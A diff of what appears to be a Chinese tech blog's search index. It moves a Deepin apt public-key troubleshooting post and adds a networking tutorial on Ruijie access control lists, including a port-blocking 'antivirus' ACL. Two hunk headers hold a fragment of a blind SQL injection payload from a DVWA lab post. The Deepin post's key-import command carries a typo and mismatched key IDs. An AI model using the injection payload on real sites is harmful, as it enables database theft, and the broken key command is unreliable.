@@ -735,64 +735,6 @@ password_pbkdf2 root +刚刚复制的哈希密码&#96;&#96;&#96;</code></pre>
       </tags>
   </entry>
   <entry>
-    <title>Deepin检查更新失败</title>
-    <url>/posts/8b4f8dc5/</url>
-    <content><![CDATA[<p>我们更新deepin系统是总会出现检查更新失败,去终端输入命令发现是没有公钥无法验证下列签名</p>
-<pre class="language-none"><code class="language-none">root@123-PC:~$ sudo apt-get update
-获取:1 https:&#x2F;&#x2F;d.store.deepinos.org.cn  InRelease [1,524 B]
-命中:3 https:&#x2F;&#x2F;community-packages.deepin.com&#x2F;deepin apricot InRelease                                        
-命中:4 https:&#x2F;&#x2F;community-packages.deepin.com&#x2F;printer eagle InRelease                                
-获取:5 https:&#x2F;&#x2F;packages.microsoft.com&#x2F;repos&#x2F;edge stable InRelease [7,343 B]                         
-命中:2 https:&#x2F;&#x2F;home-store-img.uniontech.com&#x2F;appstore deepin InRelease
-错误:5 https:&#x2F;&#x2F;packages.microsoft.com&#x2F;repos&#x2F;edge stable InRelease
-  由于没有公钥，无法验证下列签名： NO_PUBKEY EB3E94ADDE1229DD
-正在读取软件包列表... 完成
-W: GPG 错误：https:&#x2F;&#x2F;packages.microsoft.com&#x2F;repos&#x2F;edge stable InRelease: 由于没有公钥，无法验证下列签名： NO_PUBKEY EB3E94ADDE1229DD
-E: 仓库 “https:&#x2F;&#x2F;packages.microsoft.com&#x2F;repos&#x2F;edge stable InRelease” 没有数字签名。
-N: 无法安全地用该源进行更新，所以默认禁用该源。
-N: 参见 apt-secure(8) 手册以了解仓库创建和用户配置方面的细节。
-</code></pre>
-
-<h2 id="原因"><a href="#原因" class="headerlink" title="原因"></a>原因</h2><p>第三方应用商店商店（星火应用商店）的更新源与系统更新源冲突导致。</p>
-<h3 id="解决办法"><a href="#解决办法" class="headerlink" title="解决办法"></a>解决办法</h3><h3 id="方法一：把星火应用商店的仓库禁用"><a href="#方法一：把星火应用商店的仓库禁用" class="headerlink" title="方法一：把星火应用商店的仓库禁用"></a>方法一：把星火应用商店的仓库禁用</h3><blockquote>
-<p>注：此做法不影响星火应用商店安装应用</p>
-</blockquote>
-<p>打开终端先执行</p>
-<p><code>cd /etc/apt/sources.list.d</code></p>
-<p>再执行</p>
-<p><code>sudo mv sparkstore.list sparkstore.list.bkup</code></p>
-<h3 id="方法二：更新公钥"><a href="#方法二：更新公钥" class="headerlink" title="方法二：更新公钥"></a>方法二：更新公钥</h3><p>打开终端输入</p>
-<p><code>sudo apt-key adv --keyserver keyserver.ubuntu.com --recv-keys c #此处的EB3E94ADDE1229DD是报错时提示的key</code></p>
-<p>完成后显示</p>
-<pre class="language-xiao@xiao-PC:~$" data-language="xiao@xiao-PC:~$"><div class="caption"><span>sudo apt-key adv --keyserver keyserver.ubuntu.com --recv-keys EB3E94ADBE1229CF</span></div><code class="language-xiao@xiao-PC:~$">Executing: &#x2F;tmp&#x2F;apt-key-gpghome.CB8XSEEM1u&#x2F;gpg.1.sh --keyserver keyserver.ubuntu.com --recv-keys EB3E94ADDE1229DD
-gpg: 密钥 EB3E94ADDE1229DD：公钥 “Microsoft (Release signing) &lt;gpgsecurity@microsoft.com&gt;” 已导入
-gpg: 处理的总数：1
-gpg:               已导入：1</code></pre>
-
-<p>之后输入</p>
-<p><code>sudo apt-get update</code></p>
-<p>提示</p>
-<pre class="language-获取:1" data-language="获取:1"><div class="caption"><span>https://d.store.deepinos.org.cn  InRelease [1,524 B]</span></div><code class="language-获取:1">命中:3 https:&#x2F;&#x2F;community-packages.deepin.com&#x2F;deepin apricot InRelease                                        
-获取:4 https:&#x2F;&#x2F;packages.microsoft.com&#x2F;repos&#x2F;edge stable InRelease [7,343 B]                                  
-命中:5 https:&#x2F;&#x2F;community-packages.deepin.com&#x2F;printer eagle InRelease                                         
-命中:2 https:&#x2F;&#x2F;home-store-img.uniontech.com&#x2F;appstore deepin InRelease
-获取:6 https:&#x2F;&#x2F;packages.microsoft.com&#x2F;repos&#x2F;edge stable&#x2F;main amd64 Packages [11.4 kB]
-已下载 12.9 kB，耗时 1秒 (15.5 kB&#x2F;s)
-正在读取软件包列表... 完成</code></pre>
-
-
-
-<p>之后就可以去设置里更新系统了</p>
-]]></content>
-      <categories>
-        <category>教程</category>
-        <category>Linux</category>
-      </categories>
-      <tags>
-        <tag>deepin</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>DHCP协议原理与应用</title>
     <url>/posts/ca4e8c36/</url>
     <content><![CDATA[<div class="danger">
@@ -1128,6 +1070,64 @@ select * from users where id&#x3D;1 and greatest(ascii(substr(database(),1,1)),6
       </categories>
       <tags>
         <tag>DVWA</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Deepin检查更新失败</title>
+    <url>/posts/8b4f8dc5/</url>
+    <content><![CDATA[<p>我们更新deepin系统是总会出现检查更新失败,去终端输入命令发现是没有公钥无法验证下列签名</p>
+<pre class="language-none"><code class="language-none">root@123-PC:~$ sudo apt-get update
+获取:1 https:&#x2F;&#x2F;d.store.deepinos.org.cn  InRelease [1,524 B]
+命中:3 https:&#x2F;&#x2F;community-packages.deepin.com&#x2F;deepin apricot InRelease                                        
+命中:4 https:&#x2F;&#x2F;community-packages.deepin.com&#x2F;printer eagle InRelease                                
+获取:5 https:&#x2F;&#x2F;packages.microsoft.com&#x2F;repos&#x2F;edge stable InRelease [7,343 B]                         
+命中:2 https:&#x2F;&#x2F;home-store-img.uniontech.com&#x2F;appstore deepin InRelease
+错误:5 https:&#x2F;&#x2F;packages.microsoft.com&#x2F;repos&#x2F;edge stable InRelease
+  由于没有公钥，无法验证下列签名： NO_PUBKEY EB3E94ADDE1229DD
+正在读取软件包列表... 完成
+W: GPG 错误：https:&#x2F;&#x2F;packages.microsoft.com&#x2F;repos&#x2F;edge stable InRelease: 由于没有公钥，无法验证下列签名： NO_PUBKEY EB3E94ADDE1229DD
+E: 仓库 “https:&#x2F;&#x2F;packages.microsoft.com&#x2F;repos&#x2F;edge stable InRelease” 没有数字签名。
+N: 无法安全地用该源进行更新，所以默认禁用该源。
+N: 参见 apt-secure(8) 手册以了解仓库创建和用户配置方面的细节。
+</code></pre>
+
+<h2 id="原因"><a href="#原因" class="headerlink" title="原因"></a>原因</h2><p>第三方应用商店商店（星火应用商店）的更新源与系统更新源冲突导致。</p>
+<h3 id="解决办法"><a href="#解决办法" class="headerlink" title="解决办法"></a>解决办法</h3><h3 id="方法一：把星火应用商店的仓库禁用"><a href="#方法一：把星火应用商店的仓库禁用" class="headerlink" title="方法一：把星火应用商店的仓库禁用"></a>方法一：把星火应用商店的仓库禁用</h3><blockquote>
+<p>注：此做法不影响星火应用商店安装应用</p>
+</blockquote>
+<p>打开终端先执行</p>
+<p><code>cd /etc/apt/sources.list.d</code></p>
+<p>再执行</p>
+<p><code>sudo mv sparkstore.list sparkstore.list.bkup</code></p>
+<h3 id="方法二：更新公钥"><a href="#方法二：更新公钥" class="headerlink" title="方法二：更新公钥"></a>方法二：更新公钥</h3><p>打开终端输入</p>
+<p><code>sudo apt-key adv --keyserver keyserver.ubuntu.com --recv-keys c #此处的EB3E94ADDE1229DD是报错时提示的key</code></p>
+<p>完成后显示</p>
+<pre class="language-xiao@xiao-PC:~$" data-language="xiao@xiao-PC:~$"><div class="caption"><span>sudo apt-key adv --keyserver keyserver.ubuntu.com --recv-keys EB3E94ADBE1229CF</span></div><code class="language-xiao@xiao-PC:~$">Executing: &#x2F;tmp&#x2F;apt-key-gpghome.CB8XSEEM1u&#x2F;gpg.1.sh --keyserver keyserver.ubuntu.com --recv-keys EB3E94ADDE1229DD
+gpg: 密钥 EB3E94ADDE1229DD：公钥 “Microsoft (Release signing) &lt;gpgsecurity@microsoft.com&gt;” 已导入
+gpg: 处理的总数：1
+gpg:               已导入：1</code></pre>
+
+<p>之后输入</p>
+<p><code>sudo apt-get update</code></p>
+<p>提示</p>
+<pre class="language-获取:1" data-language="获取:1"><div class="caption"><span>https://d.store.deepinos.org.cn  InRelease [1,524 B]</span></div><code class="language-获取:1">命中:3 https:&#x2F;&#x2F;community-packages.deepin.com&#x2F;deepin apricot InRelease                                        
+获取:4 https:&#x2F;&#x2F;packages.microsoft.com&#x2F;repos&#x2F;edge stable InRelease [7,343 B]                                  
+命中:5 https:&#x2F;&#x2F;community-packages.deepin.com&#x2F;printer eagle InRelease                                         
+命中:2 https:&#x2F;&#x2F;home-store-img.uniontech.com&#x2F;appstore deepin InRelease
+获取:6 https:&#x2F;&#x2F;packages.microsoft.com&#x2F;repos&#x2F;edge stable&#x2F;main amd64 Packages [11.4 kB]
+已下载 12.9 kB，耗时 1秒 (15.5 kB&#x2F;s)
+正在读取软件包列表... 完成</code></pre>
+
+
+
+<p>之后就可以去设置里更新系统了</p>
+]]></content>
+      <categories>
+        <category>教程</category>
+        <category>Linux</category>
+      </categories>
+      <tags>
+        <tag>deepin</tag>
       </tags>
   </entry>
   <entry>
@@ -1556,6 +1556,466 @@ select * from users where id&#x3D;1 and greatest(ascii(substr(database(),1,1)),6
       </tags>
   </entry>
   <entry>
+    <title>IP访问控制列表</title>
+    <url>/posts/7212f06f/</url>
+    <content><![CDATA[<div class="danger">
+
+<blockquote>
+<p> 资料来源<a href="https://talent.ruijie.com.cn/certification/profession/">锐捷</a><br> 非原创</p>
+</blockquote>
+</div>
+
+
+
+
+
+<h2 id="ACL工作原理"><a href="#ACL工作原理" class="headerlink" title="ACL工作原理"></a>ACL工作原理</h2><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>访问控制列表(ACL)是一种基于包过滤的访问控制技术，它可以根据设定的条件对接口上的数据包进行控制， 允许其通过或丢弃。  访问控制列表被广泛地应用于路由器和三层交换机，借助于访问控制列表，可以有效地控制用户对网络的 访问，从而保障网络安全。</p>
+<h3 id="访问控制列表的应用场景"><a href="#访问控制列表的应用场景" class="headerlink" title="访问控制列表的应用场景"></a>访问控制列表的应用场景</h3><ul>
+<li>在接入交换机、汇聚交换机、核心交换机完成基本VLAN、路由配置，VLAN内&#x2F;外的PC可以相互通信 </li>
+<li>如果想要控制个别数据交互，又不影响与其他数据交互，这种情况下就需要使用访问控制列表</li>
+</ul>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220621151314.png" alt="1" loading="lazy"></p>
+<ul>
+<li>出于安全考虑，要求员工的PC不能访问到主管的网段，这该如何实现？</li>
+</ul>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220621151313.png" alt="2" loading="lazy"></p>
+<h3 id="访问控制列表的功能"><a href="#访问控制列表的功能" class="headerlink" title="访问控制列表的功能"></a>访问控制列表的功能</h3><ul>
+<li>访问控制列表（Access Control List），简称ACL，可以定义一系列不同的规则</li>
+<li>ACL需要设备接口进行入方向或出方向的调用，根据这些规则对数据包进行分类，并针对不同类型的报文 执行不同的处理动作。 </li>
+<li>ACL主要有以下两大功能： <ul>
+<li>使用ACL匹配流量 <ul>
+<li>用于流量过滤：可以匹配指定流量，拒绝通过或者允许通过 </li>
+<li>用于NAT：可以匹配指定流量，对这些指定的流量进行NAT转换 </li>
+<li>用于QoS：可以根据数据包的协议，指定这些被匹配的数据包的优先级</li>
+</ul>
+</li>
+<li>使用ACL匹配路由 <ul>
+<li>用于路由策略：可以用来匹配路由，进行路由条目的过滤，或者修改路由条目的属性</li>
+<li>用于路由重分布：可以匹配路由，在路由重分布时对匹配的路由执行特定的操作</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h3 id="访问控制列表的通配符"><a href="#访问控制列表的通配符" class="headerlink" title="访问控制列表的通配符"></a>访问控制列表的通配符</h3><ul>
+<li>通配符也称“反掩码”， 和IP地址结合使用，以描述一个地址范围 </li>
+<li>反掩码和子网掩码相似，但含义不同 <ul>
+<li>0表示：对应位需要比较 </li>
+<li>1表示：对应位不比较</li>
+</ul>
+</li>
+</ul>
+<p>IP地址：192.168.0.1</p>
+<table>
+<thead>
+<tr>
+<th>通配符</th>
+<th>含义</th>
+<th>最终表示的网络地址</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>0.0.0.255</td>
+<td>只比较前24位</td>
+<td>192.168.0.0&#x2F;24</td>
+</tr>
+<tr>
+<td>0.0.3.255</td>
+<td>只比较前22位</td>
+<td>192.168.0.0&#x2F;22</td>
+</tr>
+<tr>
+<td>0.255.255.255</td>
+<td>只比较前8位</td>
+<td>192.0.0.0&#x2F;8</td>
+</tr>
+<tr>
+<td>0.0.0.0</td>
+<td>每一位都精确比较</td>
+<td>192.168.0.1&#x2F;32</td>
+</tr>
+<tr>
+<td>255.255.255.255</td>
+<td>每一位都不比较</td>
+<td>0.0.0.0&#x2F;0</td>
+</tr>
+<tr>
+<td>0.63.255.255</td>
+<td>只比较前10位</td>
+<td>192.128.0.1&#x2F;10</td>
+</tr>
+</tbody></table>
+<h3 id="访问控制列表的ACE"><a href="#访问控制列表的ACE" class="headerlink" title="访问控制列表的ACE"></a>访问控制列表的ACE</h3><ul>
+<li>每一条语句也称为ACE，访问控制表项(Access Control Entry：ACE) </li>
+<li>ACE匹配的顺序为从上至下，即编号从低到高进行匹配</li>
+<li>一旦被某条ACE匹配成功（无论动作是deny或permit）, 跳出该ACL <ul>
+<li>在所有的ACE之后，存在一条默认ACE：deny ip any any（不显示）</li>
+</ul>
+</li>
+</ul>
+<h3 id="访问控制列表的两种动作"><a href="#访问控制列表的两种动作" class="headerlink" title="访问控制列表的两种动作"></a>访问控制列表的两种动作</h3><ul>
+<li>ACL的动作分为两种：permit和deny <ul>
+<li>permit：允许&#x2F;匹配permit后面语句的数据&#x2F;路由 </li>
+<li>deny：禁止&#x2F;不匹配deny后面语句的数据&#x2F;路由</li>
+</ul>
+</li>
+</ul>
+<pre class="language-none"><code class="language-none">Ruijie(config)#ip access-list standard 1
+Ruijie(config-ext-nacl)#10 permit ip 192.168.1.0 0.0.0.255
+Ruijie(config-ext-nacl)#20 deny ip 192.168.2.0 0.0.0.255</code></pre>
+
+<h3 id="访问控制列表的入方向过滤工作流程"><a href="#访问控制列表的入方向过滤工作流程" class="headerlink" title="访问控制列表的入方向过滤工作流程"></a>访问控制列表的入方向过滤工作流程</h3><p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220621151319.png" alt="3" loading="lazy"></p>
+<h3 id="访问控制列表的出方向过滤工作流程"><a href="#访问控制列表的出方向过滤工作流程" class="headerlink" title="访问控制列表的出方向过滤工作流程"></a>访问控制列表的出方向过滤工作流程</h3><p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220621151323.png" alt="4" loading="lazy"></p>
+<h2 id="ACL基本配置"><a href="#ACL基本配置" class="headerlink" title="ACL基本配置"></a>ACL基本配置</h2><h3 id="访问控制列表的常用类型"><a href="#访问控制列表的常用类型" class="headerlink" title="访问控制列表的常用类型"></a>访问控制列表的常用类型</h3><ul>
+<li>IP标准ACL 	<ul>
+<li>只能匹配IP数据包头中的源IP地址 </li>
+<li>配置ACL的时候使用”standard”关键字</li>
+</ul>
+</li>
+<li>IP扩展ACL <ul>
+<li>匹配源IP&#x2F;目的IP、协议（TCP&#x2F;IP）、协议信息（端口号、标志代码）等 </li>
+<li>配置ACL的时候使用”extended”关键字</li>
+</ul>
+</li>
+<li>除了上面两种常用类型外，还有以下其他的ACL类型</li>
+</ul>
+<table>
+<thead>
+<tr>
+<th>ACL类型</th>
+<th>可匹配内容</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>IP标准ACL</td>
+<td>源IP</td>
+</tr>
+<tr>
+<td>IP扩展ACL</td>
+<td>源IP，目的IP，ICMP type，ICMP code，TCP、UDP端口号，Fragment，TOS，DSCP，Precedence</td>
+</tr>
+<tr>
+<td>MAC扩展ACL</td>
+<td>源MAC，目的MAC，COS，协议字段（包括各种协议）</td>
+</tr>
+<tr>
+<td>专家级ACL</td>
+<td>IP扩展可匹配内容，MAC扩展可匹配内容，VID，inner VID，inner COS</td>
+</tr>
+<tr>
+<td>自定义ACL（ACL 80）</td>
+<td>专家级ACL可匹配内容，报文前80字节的任何内容</td>
+</tr>
+<tr>
+<td>IPV6 ACL</td>
+<td>源IP，目的IP，ICMP type，ICMP code，TCP、UDP端口号，Fragment，DSCP，flow-label</td>
+</tr>
+</tbody></table>
+<h3 id="标准ACL与扩展ACL的不同"><a href="#标准ACL与扩展ACL的不同" class="headerlink" title="标准ACL与扩展ACL的不同"></a>标准ACL与扩展ACL的不同</h3><ul>
+<li><p>标准ACL和扩展ACL能够匹配的数据流类型不同</p>
+<ul>
+<li>标准ACL：仅匹配数据包的源IP地址</li>
+</ul>
+<pre class="language-none"><code class="language-none">Ruijie(config)#ip access-list standard 13 
+Ruijie(config-std-nacl)#permit ?
+A.B.C.D Source address
+any Any source host
+host A single source host</code></pre>
+
+<ul>
+<li>扩展ACL：能够匹配3层及以上多种协议，并且可以同时匹配源IP和目的IP等</li>
+</ul>
+<pre class="language-none"><code class="language-none">Ruijie(config)#ip access-list extended 101
+Ruijie(config-ext-nacl)#permit ?
+&lt;0-255&gt; An IP protocol number
+eigrp Enhanced Interior Gateway Routing Protocol
+gre General Routing Encapsulation
+icmp Internet Control Message Protocol
+igmp Internet Group Managment Protocol
+ip Any Internet Protocol
+ipinip IP In IP
+nos NOS
+ospf Open Shortest Path First
+tcp Transmission Control Protocol
+udp User Datagram Protoco</code></pre>
+
+<h3 id="访问控制列表的命名"><a href="#访问控制列表的命名" class="headerlink" title="访问控制列表的命名"></a>访问控制列表的命名</h3></li>
+<li><p>数字命名 </p>
+<ul>
+<li>默认的命名，需要注意标准和扩展两种类型ACL的数字命名范围是不一样的 </li>
+<li>标准ACL常用数字命名为1-99，1300-1999扩展ACL常用数字命名为100-199，2000-2699</li>
+</ul>
+</li>
+<li><p>自定义名称 </p>
+<ul>
+<li>定义更具有代表意义的名称，推荐使用<ul>
+<li>比如禁止VLAN10内的PC访问VLAN30，可以定义为DENY_VLAN10_TO_VLAN30</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<pre class="language-none"><code class="language-none">Ruijie(config)#ip access-list standard ?
+&lt;1-99&gt; IP standard acl
+&lt;1300-1999&gt; IP standard acl (expanded range)
+WORD Acl name</code></pre>
+
+<h3 id="访问控制列表的配置命令（标准ACL）"><a href="#访问控制列表的配置命令（标准ACL）" class="headerlink" title="访问控制列表的配置命令（标准ACL）"></a>访问控制列表的配置命令（标准ACL）</h3><ul>
+<li><p>ACL通过带条件的语句来标识数据包</p>
+<ul>
+<li>例如禁止PC1（IP:192.168.1.10）和PC2（IP:192.168.2.10）访问任意目的的数据流 </li>
+<li>使用下面的配置方法进行配置</li>
+</ul>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220621151332.png" alt="5" loading="lazy"></p>
+<ul>
+<li>配置完成后，在相关设备的接口上调用即可</li>
+</ul>
+</li>
+<li><p>ACL通过带条件的语句来标识数据包 </p>
+<ul>
+<li>例如禁止PC1（IP:192.168.1.10）和PC2（IP:192.168.2.10）访问PC3（IP:192.168.3.10）的数据流 </li>
+<li>使用下面的配置方法进行配置</li>
+</ul>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220621151336.png" alt="6" loading="lazy"></p>
+<ul>
+<li>配置完成后，在相关设备的接口上调用即可。</li>
+</ul>
+<h3 id="访问控制列表的多条语句配置方法"><a href="#访问控制列表的多条语句配置方法" class="headerlink" title="访问控制列表的多条语句配置方法"></a>访问控制列表的多条语句配置方法</h3></li>
+<li><p>若存在多种不同的访问控制需求，就需要在一个ACL中定义多条语句 </p>
+<ul>
+<li>不允许VLAN10内的PC访问192.168.4.0&#x2F;24内的所有PC </li>
+<li>不允许VLAN10内的PC访问192.168.5.0&#x2F;24内的所有PC </li>
+<li>仅允许VLAN 10内的特定PC（192.168.1.10）访问 192.168.3.0&#x2F;24内的所有PC </li>
+<li>允许VLAN 10内PC可以访问10.0.5.5的tcp 80端口，该地址的其他端口均不允许访问 </li>
+<li>其他数据流放行</li>
+</ul>
+</li>
+<li><p>配置思路 </p>
+<ul>
+<li>确定是采用标准ACL还是扩展ACL</li>
+<li>将格式相同（动作、数据流类型、子网号、反掩码等）的语句放置在一起配置 </li>
+<li>根据需求配置多条语句时，要确认所配置的顺序能否满足需求（前后是否有冲突）。具体配置如下：</li>
+</ul>
+</li>
+</ul>
+<pre class="language-none"><code class="language-none">Ruijie(config)#ip access-list extended FOR_VLAN10 
+Ruijie(config-ext-nacl)#10 permit ip host 192.168.1.10 192.168.3.0 0.0.0.255
+Ruijie(config-ext-nacl)#20 deny ip 192.168.1.0 0.0.0.255 192.168.4.0 0.0.0.255
+Ruijie(config-ext-nacl)#30 deny ip 192.168.1.0 0.0.0.255 192.168.5.0 0.0.0.255
+Ruijie(config-ext-nacl)#40 permit tcp 192.168.1.0 0.0.0.255 host 10.0.5.5 eq 80
+Ruijie(config-ext-nacl)#50 deny ip 192.168.1.0 0.0.0.255 host 10.0.5.5 
+Ruijie(config-ext-nacl)#60 permit ip any any</code></pre>
+
+<h3 id="访问控制列表的序号"><a href="#访问控制列表的序号" class="headerlink" title="访问控制列表的序号"></a>访问控制列表的序号</h3><ul>
+<li>自动生成的序号，默认以10位单位递增。也可以在配置ACL中的语句时提前添加不同的序号。</li>
+</ul>
+<pre class="language-none"><code class="language-none">ip access-list extended FOR_VLAN10
+10 permit ip host 192.168.1.10 192.168.3.0 0.0.0.255 
+20 deny ip 192.168.1.0 0.0.0.255 192.168.4.0 0.0.0.255 
+30 deny ip 192.168.1.0 0.0.0.255 192.168.5.0 0.0.0.255 
+40 permit tcp 192.168.1.0 0.0.0.255 host 10.0.5.5 eq www 
+50 deny ip 192.168.1.0 0.0.0.255 host 10.0.5.5 
+60 permit ip any any</code></pre>
+
+<ul>
+<li>如果新增需求：禁止VLAN 10内的PC访问192.168.6.0&#x2F;24。配置如下：</li>
+</ul>
+<pre class="language-none"><code class="language-none">Ruijie(config)#ip access-list extended FOR_VLAN10
+Ruijie(config-ext-nacl)#31 deny ip 192.168.1.0 0.0.0.255 192.168.6.0 0.0.0.255</code></pre>
+
+<pre class="language-none"><code class="language-none">ip access-list extended FOR_VLAN10
+10 permit ip host 192.168.1.10 192.168.3.0 0.0.0.255 
+20 deny ip 192.168.1.0 0.0.0.255 192.168.4.0 0.0.0.255 
+30 deny ip 192.168.1.0 0.0.0.255 192.168.3.0 0.0.0.255 
+31 deny ip 192.168.1.0 0.0.0.255 192.168.6.0 0.0.0.255 
+40 permit tcp 192.168.1.0 0.0.0.255 host 10.0.5.5 eq www 
+50 deny ip 192.168.1.0 0.0.0.255 host 10.0.5.5 
+60 permit ip any any</code></pre>
+
+<h3 id="访问控制列表的应用位置"><a href="#访问控制列表的应用位置" class="headerlink" title="访问控制列表的应用位置"></a>访问控制列表的应用位置</h3><p>1、应用在接口的入方向还是出方向？ </p>
+<ul>
+<li>数据流是从交换机的接口出入，需要将配置好的ACL应用在接口上 </li>
+<li>接口可以是物理接口也可以是SVI </li>
+<li>应用的方向根据ACL的内容以及数据流进入接口的方向进行配置选择</li>
+</ul>
+<pre class="language-none"><code class="language-none">ip access-list extended FOR_VLAN10
+10 permit ip host 192.168.1.10 192.168.3.0 0.0.0.255 
+20 deny ip 192.168.1.0 0.0.0.255 192.168.4.0 0.0.0.255 
+30 deny ip 192.168.1.0 0.0.0.255 192.168.3.0 0.0.0.255 
+31 deny ip 192.168.1.0 0.0.0.255 192.168.6.0 0.0.0.255 
+40 permit tcp 192.168.1.0 0.0.0.255 host 10.0.5.5 eq www 
+50 deny ip 192.168.1.0 0.0.0.255 host 10.0.5.5 
+60 permit ip any any</code></pre>
+
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220621151344.png" alt="7" loading="lazy"></p>
+<p>2、在什么设备上配置ACL？</p>
+<ul>
+<li>需要结合实际的需求来判断将ACL应用在什么层次的设备上 <ul>
+<li>控制VLAN内的数据流，则需要在接入交换机上配置ACL </li>
+<li>控制VLAN间的数据流，则需要在汇聚交换机（网关）配置ACL</li>
+</ul>
+</li>
+<li>配置如下的ACL，应用在何处才能够使得PC A无法访问PC B？<ul>
+<li>B是对的，因为同一个vlan内的数据流不需要经过汇聚交换机</li>
+</ul>
+</li>
+</ul>
+<pre class="language-none"><code class="language-none">ip access-list extended FOR_VLAN10
+10 deny ip host 192.168.1.10 host 192.168.1.20 
+20 permit ip any any</code></pre>
+
+
+
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220621151348.png" alt="8" loading="lazy"></p>
+<p>2、在什么设备上配置ACL？ </p>
+<ul>
+<li>要求VLAN10不能访问VLAN30，VLAN20不能访问VLAN40 <ul>
+<li>如果将ACL配置在接入交换机上，需要在多台交换机上配置，配置工作量较大，而且容易出错 </li>
+<li>因此控制跨网段转发的数据，建议在汇聚网关(SVI接口)上配置ACL，这样可以减少配置量，并方便维护</li>
+</ul>
+</li>
+</ul>
+<pre class="language-none"><code class="language-none">ip access-list extended FOR_VLAN10（为VLAN20配置的ACL略）
+10 deny ip 192.168.1.0 0.0.0.255 192.168.3.0 0.0.0.255 
+20 permit ip any any</code></pre>
+
+<pre class="language-none"><code class="language-none">Ruijie(config)#int vlan 10
+Ruijie((config-VLAN 10)#ip access-group FOR_VLAN10 in
+Ruijie(config)#int vlan 20
+Ruijie((config-VLAN 20)#ip access-group FOR_VLAN20 in</code></pre>
+
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220621151352.png" alt="9" loading="lazy"></p>
+<p>3、ACL是在靠近源的设备上应用还是靠近目的的设备上应用？ </p>
+<ul>
+<li>需要结合ACL的类型以及实际的应用、配置的工作量进行考虑<ul>
+<li>标准ACL（匹配源地址），在靠近报文目的的设备上进行配置 <ul>
+<li>如果应用在靠近数据源的设备上，会有什么问题？</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220621151356.png" alt="10" loading="lazy"></p>
+<p>3、ACL是在靠近源的设备上应用还是靠近目的的设备上应用？ </p>
+<ul>
+<li>需要结合ACL的类型以及实际的应用、配置的工作量进行考虑 <ul>
+<li>标准ACL（匹配源地址），在靠近报文目的的设备上进行配置 </li>
+<li>扩展ACL（匹配目的地址），建议在靠近报文源的设备上进行配置 <ul>
+<li>避免数据包在网络中经过多个设备转发才在靠近目的的设备上被丢弃掉，会浪费网络资源</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220621151359.png" alt="11" loading="lazy"></p>
+<p>3、ACL是在靠近源的设备上应用还是靠近目的的设备上应用？</p>
+<ul>
+<li>需要结合ACL的类型以及实际的应用、配置的工作量进行考虑 </li>
+<li>标准ACL（匹配源地址），在靠近报文目的的设备上进行配置 </li>
+<li>扩展ACL（匹配目的地址），建议在靠近报文源的设备上进行配置 </li>
+<li>对于扩展ACL，如果想集中控制的话，也可以在报文目的设备上进行配置 <ul>
+<li>&#96;若要控制很多源IP网段不能访问PC B，可以在靠近PC B的设备上应用ACL，减少配置工作量，实现集中管理</li>
+</ul>
+</li>
+</ul>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220621151403.png" alt="12" loading="lazy"></p>
+<h2 id="ACL的其他应用"><a href="#ACL的其他应用" class="headerlink" title="ACL的其他应用"></a>ACL的其他应用</h2><h3 id="防病毒应用"><a href="#防病毒应用" class="headerlink" title="防病毒应用"></a>防病毒应用</h3><ul>
+<li><p>在实际中除了使用ACL控制网段之间的互访外，还有一种比较常见的用法，就是封闭常见的病毒或木马占 用的端口，并在三层网关SVI接口下应用，如下的防病毒ACL配置 </p>
+<ul>
+<li>防病毒的ACL也可能会与某些应用的端口号重合，实施时需要注意 </li>
+<li>控制互访和防病毒两种应用在实际中也多结合在一起，因此在配置的时候需要注意ACE的先后顺序</li>
+</ul>
+<pre class="language-none"><code class="language-none">ip access-list extended antivirus
+10 deny tcp any any eq 1068 
+20 deny tcp any any eq 5554 
+30 deny tcp any any eq 9995 
+40 deny tcp any any eq 9996 
+50 deny tcp any any eq 1022 
+60 deny tcp any any eq 1023 
+70 deny tcp any any eq 445 
+80 deny tcp any any eq 135 
+90 deny tcp any any eq 4444 
+100 deny tcp any any eq 1080 
+110 deny tcp any any eq 3128 
+…(省略部分)
+280 permit ip any any</code></pre></li>
+</ul>
+<h3 id="基于时间的ACL配置思路"><a href="#基于时间的ACL配置思路" class="headerlink" title="基于时间的ACL配置思路"></a>基于时间的ACL配置思路</h3><ul>
+<li>ACL可以添加时间参数，使其在特定的时间生效 <ul>
+<li>绝对时间段： absolute，定义一个绝对的时间段 </li>
+<li>周期时间段： periodic，定义一个循环往复的时间段</li>
+</ul>
+</li>
+<li>确保设备时间配置准确：在#模式下使用clock set命令设置</li>
+<li>将时间参数和ACE关联 </li>
+<li>调用ACL</li>
+</ul>
+<h3 id="基于时间的ACL配置案例"><a href="#基于时间的ACL配置案例" class="headerlink" title="基于时间的ACL配置案例"></a>基于时间的ACL配置案例</h3><ul>
+<li>例如：公司架设有web服务器，其IP地址为192.168.1.100，要求该服务器在特定的时间内对外提供服务， 详细需求如下： <ul>
+<li>仅在工作日的早上9：00至下午18：00提供员工访问，其他时间均不能访问 </li>
+<li>仅在2021年 7月28日早上9：00至中午12：00提供员工股访问，其他时间均不能访问</li>
+</ul>
+</li>
+</ul>
